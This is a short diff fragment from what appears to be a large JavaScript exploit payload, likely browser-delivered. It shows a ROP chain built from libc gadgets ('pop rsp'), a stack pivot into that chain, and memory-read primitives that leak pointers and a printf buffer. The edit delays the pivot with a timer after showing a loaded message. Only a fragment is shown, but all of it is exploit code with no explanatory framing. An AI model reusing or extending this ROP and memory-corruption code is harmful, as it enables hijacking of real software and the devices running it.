@@ -26797,11 +26797,14 @@ libc_base+782311 //pop rsp
 db([0, 0]); // 0x0
 //L2632:
 db([2, 0, 0, 0, 0, 0]);
-pivot(ropchain);
-var main_ret = read_ptr_at(main_ret);
-var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
-var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
-var _ = malloc_nogc.pop();
-var _ = malloc_nogc.pop();
-var _ = malloc_nogc.pop();
-},1000);
+msgs.innerHTML=LoadedMSG;
+setTimeout(function(){
+    pivot(ropchain);
+    },500);
+    var main_ret = read_ptr_at(main_ret);
+    var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
+    var printf_ans = read_mem_as_string(printf_buf,printf_buf_end-printf_buf);
+    var _ = malloc_nogc.pop();
+    var _ = malloc_nogc.pop();
+    var _ = malloc_nogc.pop();
+    },1000);
